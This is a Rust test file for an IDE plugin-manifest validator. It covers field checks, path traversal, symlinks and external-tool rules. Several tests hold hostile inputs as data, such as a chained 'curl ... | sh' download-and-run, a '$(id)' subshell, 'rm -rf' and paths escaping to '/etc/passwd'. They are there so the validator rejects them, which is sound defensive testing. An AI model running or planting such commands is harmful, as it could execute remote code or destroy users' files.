//! Manifest parsing and plugin-directory validation.

mod common;

#[cfg(unix)]
use common::write_files;
use common::{example_dir, write_plugin, write_tool_plugin};
use rustpy_highlight::{HighlightTag, Rgb};
use rustpy_plugins::{validate_plugin_dir, PluginError, PluginManifest};
use rustpy_templates::TemplateContext;
use serde_json::json;

fn problems_of(json: &str) -> Vec<String> {
    match PluginManifest::from_json(json) {
        Err(PluginError::Invalid { problems }) => problems,
        other => panic!("expected validation problems, got {other:?}"),
    }
}

fn assert_mentions(problems: &[String], needles: &[&str]) {
    let all = problems.join("\n");
    for needle in needles {
        assert!(all.contains(needle), "missing {needle:?} in:\n{all}");
    }
}

#[test]
fn example_plugin_is_valid() {
    let manifest = PluginManifest::load(&example_dir()).unwrap();
    assert_eq!(manifest.id, "com.example.solarized-theme");
    assert_eq!(manifest.name, "Solarized Theme");
    assert_eq!(manifest.version, "1.0.0");
    assert_eq!(manifest.min_ide_version.as_deref(), Some("0.1.0"));
    assert_eq!(
        manifest.contributes.color_schemes,
        vec!["colors/solarized-dark.json"]
    );
    assert!(manifest.is_compatible_with(rustpy_plugins::IDE_VERSION));

    let plugin = validate_plugin_dir(&example_dir()).unwrap();
    assert!(plugin.warnings.is_empty(), "{:?}", plugin.warnings);
    assert!(plugin.dir.is_absolute());
    let c = &plugin.contributions;
    assert_eq!(c.color_schemes.len(), 1);
    let scheme = &c.color_schemes[0].scheme;
    assert_eq!(scheme.name, "Solarized Dark (Plugin)");
    assert!(scheme.dark, "inherits `dark` from the Dark base");
    assert_eq!(scheme.editor.background, Rgb(0x00, 0x2b, 0x36));
    assert_eq!(
        scheme.style(HighlightTag::Keyword).fg,
        Some(Rgb(0x85, 0x99, 0x00))
    );
    assert!(scheme.style(HighlightTag::Comment).italic);
    assert_eq!(c.color_schemes[0].plugin_id, "com.example.solarized-theme");
    assert!(c.color_schemes[0]
        .path
        .ends_with("colors/solarized-dark.json"));

    let templates = c.all_live_templates();
    let abbreviations: Vec<&str> = templates.iter().map(|t| t.abbreviation.as_str()).collect();
    assert_eq!(abbreviations, vec!["bp", "logger", "todo"]);
    assert!(templates.iter().all(|t| t.group == "Solarized Theme"));
    assert_eq!(templates[1].contexts, vec![TemplateContext::Module]);
    // `text` / `context` are accepted as aliases of `template` / `contexts`.
    assert_eq!(templates[2].template, "# TODO($USER$): $END$");
    assert_eq!(templates[2].contexts, vec![TemplateContext::Statement]);
    assert_eq!(templates[2].variables[0].expression, "user()");
}

#[test]
fn minimal_manifest_gets_defaults() {
    let m =
        PluginManifest::from_json(r#"{"id": "com.example.min", "name": "Min", "version": "0.1"}"#)
            .unwrap();
    assert_eq!(m.description, "");
    assert_eq!(m.homepage, None);
    assert!(m.contributes.live_templates.is_empty());
    assert!(m.contributes.external_tools.is_empty());
    assert!(
        m.is_compatible_with("0.0.1"),
        "no min_ide_version means any IDE"
    );
}

#[test]
fn every_missing_field_is_reported_at_once() {
    let problems = problems_of("{}");
    assert_mentions(
        &problems,
        &[
            "id: is required",
            "name: is required",
            "version: is required",
        ],
    );
    assert_eq!(problems.len(), 3, "{problems:?}");
}

#[test]
fn bad_values_are_explained() {
    let problems = problems_of(
        r#"{"id": "MyPlugin", "name": "X", "version": "one", "homepage": "ftp://example.com", "min_ide_version": "latest"}"#,
    );
    assert_mentions(
        &problems,
        &[
            "id: `MyPlugin`",
            "version: version `one` is not semver-like",
            "homepage: `ftp://example.com` is not an http(s) URL",
            "min_ide_version:",
        ],
    );
    assert_mentions(
        &problems_of(r#"{"id": "com.Example.x", "name": "X", "version": "1"}"#),
        &["must be lowercase"],
    );
    assert_mentions(
        &problems_of(r#"{"id": "plugin", "name": "X", "version": "1"}"#),
        &["reverse-DNS"],
    );
    assert_mentions(
        &problems_of(r#"{"id": "com.x", "name": "X", "version": "v1.0"}"#),
        &["drop the leading `v`"],
    );
    assert_mentions(
        &problems_of(r#"{"id": "state.json", "name": "X", "version": "1"}"#),
        &["reserved"],
    );
}

#[test]
fn path_traversal_and_absolute_paths_are_rejected() {
    let problems = problems_of(
        &json!({
            "id": "com.example.evil", "name": "Evil", "version": "1.0.0",
            "contributes": {
                "live_templates": ["../outside.json", "ok.json"],
                "color_schemes": ["/etc/passwd"],
                "keymaps": ["keys/../../../x.json", "C:/Windows/x.json", "keys\\x.json"],
                "textmate_grammars": [{"language": "X", "extensions": ["x"], "path": "../g.tmLanguage.json"}],
                "file_templates": [{"name": "T", "extension": "py", "path": "/abs/template.py"}]
            }
        })
        .to_string(),
    );
    assert_mentions(
        &problems,
        &[
            "contributes.live_templates[0]: `../outside.json` points outside the plugin directory",
            "contributes.color_schemes[0]: `/etc/passwd` is an absolute path",
            "contributes.keymaps[0]: `keys/../../../x.json` points outside",
            "contributes.keymaps[1]: `C:/Windows/x.json` is an absolute path",
            "contributes.keymaps[2]: `keys\\x.json` uses `\\`",
            "contributes.textmate_grammars[0].path: `../g.tmLanguage.json` points outside",
            "contributes.file_templates[0].path: `/abs/template.py` is an absolute path",
        ],
    );
    assert!(
        !problems.iter().any(|p| p.contains("live_templates[1]")),
        "valid paths are fine"
    );
}

#[test]
fn external_tools_cannot_smuggle_shell_commands() {
    let problems = problems_of(
        &json!({
            "id": "com.example.tools", "name": "Tools", "version": "1.0.0",
            "contributes": {"external_tools": [
                {"name": "Chained", "program": "black", "arguments": "$FilePath$; curl https://example.com | sh"},
                {"name": "Subshell", "program": "echo", "arguments": "$(id)"},
                {"name": "Absolute", "program": "/usr/bin/rm", "arguments": "-rf"},
                {"name": "Spaces", "program": "python -m black"},
                {"name": "Escape", "program": "$PluginDir$/../bin/tool"},
                {"name": "Env", "program": "echo", "arguments": "$HOME"},
                {"name": "Cwd", "program": "ruff", "working_dir": "/tmp"},
                {"name": "ArgEscape", "program": "ruff", "arguments": "--config=$PluginDir$/../../x.toml"},
                {"name": "", "program": "ruff"}
            ]}
        })
        .to_string(),
    );
    assert_mentions(
        &problems,
        &[
            "external_tools[0].arguments: `;` is not allowed",
            "external_tools[1].arguments: `(` is not allowed",
            "external_tools[2].program: `/usr/bin/rm` must be a command name on the PATH",
            "external_tools[3].program: `python -m black` must be a single command",
            "external_tools[4].program: `../bin/tool` points outside",
            "external_tools[5].arguments: `$` may only appear in macros",
            "external_tools[6].working_dir: `/tmp` must start with a macro",
            "external_tools[7].arguments: `../../x.toml` points outside",
            "external_tools[8].name: is required",
        ],
    );
    assert!(PluginManifest::from_json(
        &json!({"id": "com.example.ok", "name": "Ok", "version": "1", "contributes": {"external_tools": [
            {"name": "Lint", "program": "ruff", "arguments": "check \"$FilePath$\" --config $PluginDir$/ruff.toml", "working_dir": "$ProjectFileDir$"},
            {"name": "Script", "program": "$PluginDir$/bin/run.sh"}
        ]}})
        .to_string()
    )
    .is_ok());
}

#[test]
fn json_errors_point_at_the_problem() {
    let err = PluginManifest::from_json("{\n  \"id\": \"com.x.y\",\n").unwrap_err();
    assert!(matches!(err, PluginError::Json { .. }));
    assert!(err.to_string().starts_with("plugin.json: "), "{err}");
    assert!(err.to_string().contains("line"), "{err}");

    let err = PluginManifest::from_json(r#"{"id": "com.x.y", "name": "x", "version": "1", "contributes": {"live_templates": "a.json"}}"#)
        .unwrap_err();
    assert!(err.to_string().contains("invalid type"), "{err}");
    assert!(PluginManifest::from_json("[1, 2]")
        .unwrap_err()
        .to_string()
        .contains("JSON object"));
}

#[test]
fn unknown_fields_are_tolerated_and_reported() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = write_plugin(
        tmp.path(),
        "p",
        json!({"contribute": {"keymaps": []}, "icon": "x.svg", "contributes": {"themes": [], "external_tools": [{"name": "T", "program": "ruff", "shortcut": "F5"}]}}),
        &[],
    );
    let plugin = validate_plugin_dir(&dir).expect("unknown fields do not make a plugin invalid");
    assert_mentions(
        &plugin.warnings,
        &[
            "plugin.json: unknown field `contribute` is ignored (did you mean `contributes`?)",
            "plugin.json: unknown field `icon` is ignored",
            "contributes: unknown field `themes` is ignored",
            "contributes.external_tools[0]: unknown field `shortcut` is ignored",
        ],
    );
}

#[test]
fn contribution_files_are_checked() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = write_plugin(
        tmp.path(),
        "p",
        json!({"contributes": {
            "color_schemes": ["colors/missing.json", "colors/broken.json", "colors/builtin-name.json"],
            "live_templates": ["templates/object.json"],
            "keymaps": ["keys/bad.json"],
            "textmate_grammars": [{"language": "X", "extensions": ["x"], "path": "syntaxes/not-a-grammar.json"}],
            "file_templates": [{"name": "T", "extension": "py", "path": "templates"}]
        }}),
        &[
            ("colors/broken.json", "{ nope"),
            (
                "colors/builtin-name.json",
                r##"{"name": "Dark", "base": "Dark", "colors": {"Keyword": "#12345"}}"##,
            ),
            ("templates/object.json", r#"{"abbreviation": "x"}"#),
            (
                "keys/bad.json",
                r#"{"name": "K", "bindings": {"Run": ["Ctrl+K Ctrl+R"]}}"#,
            ),
            ("syntaxes/not-a-grammar.json", r#"{"name": "X"}"#),
            (
                "templates/placeholder.txt",
                "the `templates` directory is not a file",
            ),
        ],
    );
    let problems = validate_plugin_dir(&dir).unwrap_err().problems();
    assert_mentions(
        &problems,
        &[
            "contributes.color_schemes[0]: `colors/missing.json` does not exist in the plugin directory",
            "contributes.color_schemes[1]: `colors/broken.json` is not valid JSON",
            "contributes.color_schemes[2]: name: `Dark` is a built-in scheme",
            "contributes.color_schemes[2]: colors.Keyword: `#12345` is not a #rrggbb color",
            "contributes.live_templates[0]: expected a JSON array of live templates",
            "contributes.keymaps[0]: bindings.Run: `Ctrl+K Ctrl+R`",
            "contributes.textmate_grammars[0]: `syntaxes/not-a-grammar.json` is not a TextMate grammar (no `scopeName`)",
            "contributes.file_templates[0]: `templates` is not a regular file",
        ],
    );
}

#[cfg(unix)]
#[test]
fn symlinks_out_of_the_plugin_are_rejected() {
    let tmp = tempfile::tempdir().unwrap();
    write_files(
        tmp.path(),
        &[("secret.json", r#"{"name": "S", "bindings": {}}"#)],
    );
    let dir = write_plugin(
        tmp.path(),
        "p",
        json!({"contributes": {"keymaps": ["keys.json"]}}),
        &[],
    );
    std::os::unix::fs::symlink(tmp.path().join("secret.json"), dir.join("keys.json")).unwrap();
    let problems = validate_plugin_dir(&dir).unwrap_err().problems();
    assert_mentions(
        &problems,
        &["`keys.json` is a link to a file outside the plugin directory"],
    );
}

#[test]
fn every_contribution_type_resolves() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = write_tool_plugin(tmp.path(), "tools", "com.example.tools", "2.0.0");
    let plugin = validate_plugin_dir(&dir).unwrap();
    let c = &plugin.contributions;
    let dir = plugin.dir.clone();

    let keymap = c.keymap("Test Keys").expect("keymap");
    assert_eq!(keymap.bindings["GotoAction"], vec!["Ctrl+Shift+A", "F1"]);
    assert_eq!(keymap.path, dir.join("keymaps").join("test.json"));

    let grammar = c
        .grammar_for_extension(".TOY")
        .expect("grammar by extension, case-insensitive");
    assert_eq!(grammar.scope_name, "source.toy");
    assert_eq!(grammar.language, "Toy");
    assert_eq!(grammar.extensions, vec!["toy", "TOYS"]);
    assert!(c.grammar_for_extension("toys").is_some());
    assert!(c.grammar_for_extension("py").is_none());

    let tool = &c.external_tools[0].tool;
    assert_eq!(tool.name, "Lint");
    assert_eq!(tool.group, "Linters");
    assert_eq!(tool.program, "ruff");
    assert!(
        tool.arguments.starts_with("check --config "),
        "{}",
        tool.arguments
    );
    assert!(
        tool.arguments.contains(&dir.to_string_lossy().to_string()),
        "{}",
        tool.arguments
    );
    assert!(
        tool.arguments.ends_with("/ruff.toml $FilePath$"),
        "IDE macros stay: {}",
        tool.arguments
    );
    assert_eq!(tool.working_dir, "$ProjectFileDir$");
    assert!(tool.show_console);

    let template = &c.file_templates[0];
    assert_eq!(template.extension, "toy");
    assert_eq!(template.render(&[("NAME", "demo")]), "# demo\ntoy\n");
    assert!(c.all_external_tools().len() == 1 && c.all_live_templates().is_empty());
}

#[test]
fn plist_grammars_and_plugin_dir_programs() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = write_plugin(
        tmp.path(),
        "with space",
        json!({"name": "Spaced", "contributes": {
            "textmate_grammars": [{"language": "Nim", "extensions": ["nim"], "path": "Nim.tmLanguage"}],
            "external_tools": [{"name": "Run", "program": "$PluginDir$/bin/run.sh", "working_dir": "$PluginDir$/bin", "show_console": false}]
        }}),
        &[
            (
                "Nim.tmLanguage",
                "<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict><key>scopeName</key><string>source.nim</string><key>patterns</key><array/></dict></plist>\n",
            ),
            ("bin/run.sh", "#!/bin/sh\necho hi\n"),
        ],
    );
    let plugin = validate_plugin_dir(&dir).unwrap();
    assert_eq!(
        plugin.contributions.textmate_grammars[0].scope_name,
        "source.nim"
    );
    let tool = &plugin.contributions.external_tools[0].tool;
    let dir_text = plugin.dir.to_string_lossy().to_string();
    // The directory contains a space, so the program is quoted (the IDE splits
    // a quoted program into words, and its first word is the program).
    assert_eq!(tool.program, format!("\"{dir_text}/bin/run.sh\""));
    assert_eq!(tool.working_dir, format!("{dir_text}/bin"));
    assert_eq!(tool.group, "Spaced", "group defaults to the plugin name");
    assert!(!tool.show_console);

    // A program under $PluginDir$ must exist.
    std::fs::remove_file(dir.join("bin/run.sh")).unwrap();
    assert_mentions(
        &validate_plugin_dir(&dir).unwrap_err().problems(),
        &["`bin/run.sh` does not exist"],
    );
}

#[test]
fn missing_manifest() {
    let tmp = tempfile::tempdir().unwrap();
    let err = validate_plugin_dir(tmp.path()).unwrap_err();
    assert_mentions(
        &err.problems(),
        &["`plugin.json` does not exist in the plugin directory"],
    );
    assert!(PluginManifest::load(tmp.path())
        .unwrap_err()
        .to_string()
        .contains("no plugin.json"));
}

/// Review finding: `$NAME$` tokens other than the IDE's macros reached `sh`,
/// which expanded `$NAME` from the environment.
#[test]
fn only_the_ide_macros_are_accepted_in_tools() {
    let problems = problems_of(
        &json!({
            "id": "com.example.env", "name": "Env", "version": "1.0.0",
            "contributes": {"external_tools": [
                {"name": "Secret", "program": "echo", "arguments": "$REVIEW_SECRET$ $HOME$"},
                {"name": "Program", "program": "$HOME$/bin/x"},
                {"name": "Cwd", "program": "ruff", "working_dir": "$TMPDIR$"},
                {"name": "Escaped", "program": "echo", "arguments": "\\$FilePath$"}
            ]}
        })
        .to_string(),
    );
    assert_mentions(
        &problems,
        &[
            "external_tools[0].arguments: `$REVIEW_SECRET$` is not a macro",
            "external_tools[1].program: `$HOME$` is not a macro",
            "external_tools[2].working_dir: `$TMPDIR$` is not a macro",
            "external_tools[3].arguments: `\\$` is not allowed",
        ],
    );
}

/// Review finding: a quote ended the path check, so `"$PluginDir$"/../../..` passed.
#[test]
fn quoted_plugin_dir_cannot_escape_the_plugin() {
    let problems = problems_of(
        &json!({
            "id": "com.example.esc", "name": "Esc", "version": "1.0.0",
            "contributes": {"external_tools": [
                {"name": "Esc", "program": "echo", "arguments": "\"$PluginDir$\"/../../.."},
                {"name": "Esc2", "program": "echo", "arguments": "--x='$PluginDir$/..'/etc"}
            ]}
        })
        .to_string(),
    );
    assert_mentions(
        &problems,
        &[
            "external_tools[0].arguments: `../../..` points outside",
            "external_tools[1].arguments: `../etc` points outside",
        ],
    );
}

/// Review finding: `$PluginDir$` inside double quotes kept literal `'` characters
/// when the plugin directory needs quoting (`Application Support` on macOS).
#[cfg(unix)]
#[test]
fn quoted_plugin_dir_runs_from_a_directory_with_spaces() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = write_plugin(
        tmp.path(),
        "Application Support",
        json!({"contributes": {"external_tools": [
            {"name": "Cat", "program": "cat", "arguments": "\"$PluginDir$/data/it's.txt\" $PluginDir$/data/plain.txt '$PluginDir$/data/plain.txt'"}
        ]}}),
        &[("data/it's.txt", "one\n"), ("data/plain.txt", "two\n")],
    );
    let plugin = validate_plugin_dir(&dir).unwrap();
    let tool = &plugin.contributions.external_tools[0].tool;
    let out = common::run_like_the_ide(tool, &[], tmp.path());
    assert!(
        out.status.success(),
        "{}: {}",
        tool.arguments,
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(String::from_utf8_lossy(&out.stdout), "one\ntwo\ntwo\n");
}

/// A `$PluginDir$/…` program that is not executable gets a warning (installing
/// the plugin fixes the mode, see the registry tests).
#[cfg(unix)]
#[test]
fn non_executable_plugin_programs_are_reported() {
    use std::os::unix::fs::PermissionsExt;
    let tmp = tempfile::tempdir().unwrap();
    let dir = write_plugin(
        tmp.path(),
        "p",
        json!({"contributes": {"external_tools": [{"name": "Run", "program": "$PluginDir$/bin/run.sh"}]}}),
        &[("bin/run.sh", "#!/bin/sh\necho hi\n")],
    );
    let run = dir.join("bin/run.sh");
    std::fs::set_permissions(&run, std::fs::Permissions::from_mode(0o644)).unwrap();
    let warnings = validate_plugin_dir(&dir).unwrap().warnings;
    assert!(
        warnings
            .iter()
            .any(|w| w.contains("`bin/run.sh` is not executable")),
        "{warnings:?}"
    );
    std::fs::set_permissions(&run, std::fs::Permissions::from_mode(0o755)).unwrap();
    assert!(validate_plugin_dir(&dir).unwrap().warnings.is_empty());
}

/// Review finding: Windows device names were accepted in manifest paths.
#[test]
fn windows_device_names_are_not_portable_paths() {
    let problems = problems_of(
        &json!({
            "id": "com.example.dev", "name": "Dev", "version": "1.0.0",
            "contributes": {"color_schemes": ["colors/nul.json"], "keymaps": ["CON"]}
        })
        .to_string(),
    );
    assert_mentions(
        &problems,
        &[
            "contributes.color_schemes[0]: `colors/nul.json` uses `nul.json`, a name Windows reserves",
            "contributes.keymaps[0]: `CON` uses `CON`, a name Windows reserves",
        ],
    );
}
